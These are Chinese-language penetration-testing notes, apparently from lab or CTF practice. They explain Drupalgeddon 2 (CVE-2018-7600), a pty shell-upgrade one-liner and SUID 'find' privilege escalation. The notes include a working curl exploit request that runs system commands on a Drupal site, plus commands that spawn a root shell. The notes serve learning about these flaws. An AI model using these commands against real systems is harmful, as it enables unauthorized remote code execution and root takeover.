### 1. \[CVE-2018-7600\] Drupalgeddon 2
---
**Drupalgeddon 2** **\[CVE-2018-7600\]** 是一个严重的远程代码执行漏洞，影响 Drupal 7.58 之前的版本、8.3.9 之前的 8.x 版本、8.4.6 之前的 8.4.x 版本以及 8.5.1 之前的 8.5.x 版本。该漏洞允许未经认证的攻击者通过特定的请求执行任意 PHP 代码，从而完全控制目标系统。
#### 漏洞原理
漏洞的核心在于 Drupal 的表单渲染机制未正确隔离用户输入。攻击者可以通过构造特定的参数（如 `#post_render` 和 `#markup`），劫持表单渲染流程并执行任意函数。以下是关键触发点：
- **表单字段合并**：用户提交的数据会递归合并到表单结构中。
- **渲染函数调用**：系统会自动调用字段中的 `#post_render` 或 `#markup` 指定的函数。
- **命令执行**：攻击者可通过 `exec()` 等函数执行系统命令。
#### 漏洞利用
以下是利用该漏洞的常见步骤：
1. 构造恶意 POST 请求，目标 URL 通常为`/user/register`。
2. 使用参数如 `mail[#post_render][]=exec` 和 `mail[#markup]=id`，触发命令执行。
3. 通过工具发送请求并验证漏洞是否存在。
##### 示例
```bash
curl -k -i 'http://target-site/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
--data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'
```
#### 总结
Drupalgeddon 2 的本质是攻击者通过控制结构化字段，劫持函数调用链并利用渲染机制实现未授权的代码执行。及时更新和加强安全配置是防止此类漏洞的关键。
#### 拓展思考
是否能不用 MSF，用 Python 脚本手动打进去？
（搜索`Drupal 7 SQL injection python exploit`，传递以上示例参数即可）

### 2. 哑终端 (Dumb) 和交互式终端 (Interactive)
---
也就是以下 Python 命令：
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
`pty` 模块主要用于生成伪终端，读取程序 `/bin/bash` 并生成交互式进程，从而实现 Shell 升级。

### 3. SUID `find` 提权
---
命令
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null
```
的作用是：**在根目录 `/` 下，递归搜索所有设置了SUID位的普通文件。**
其中：
- `-perm -u=s` 查找用户的执行位被设置为 `s`（即SUID）的文件（`-4000` 是其等价的八进制数字表示法）
- **SUID的作用**：当一个**可执行文件**被设置了SUID位后，**任何用户在执行这个文件时，都会暂时获得该文件所有者（通常是root）的权限**，而不是执行者自身的权限。
- **设计的初衷**：为了方便普通用户完成一些需要特权的任务。例如，最经典的例子是 `passwd` 命令（位于 `/usr/bin/passwd`）。普通用户需要修改自己的密码，但这个操作会写入受保护的 `/etc/shadow` 文件。`passwd` 命令设置了SUID且所有者是root，因此用户执行它时，能临时获得root权限来修改密码。
- `-type f`：只查找普通文件，排除目录、链接等。
- `2>/dev/null`：将命令执行过程中产生的**所有错误信息（标准错误输出，文件描述符为2）重定向到 `/dev/null`（一个丢弃所有数据的地方）**。这样做是因为在搜索系统根目录时，会遇到大量因权限不足而无法访问的目录，从而产生烦人的 “Permission denied” 错误。加上这部分可以让输出结果**干净、清晰**，只显示成功查找到的文件。
因 `/usr/bin/find` 设置了SUID，故以下命令
```bash
find . -exec "/bin/bash" \;
find . -exec "/bin/sh" \;
```
可以提权！简要解释：
- `find`： 调用具有SUID权限的 `find` 命令。
- `-exec ... \;`： `find` 命令的“执行”参数。它会执行 `-exec` 后面指定的命令。
- `"/bin/bash"`： `-exec` 要执行的命令，这里是启动一个Bash Shell。
- `"/bin/sh"`：更简单的 Shell 软链接。
于是就此获得**Root Shell**。

### 4. 补充
---
一定要注意当前目录（CWD）！有时脚本会因此报错。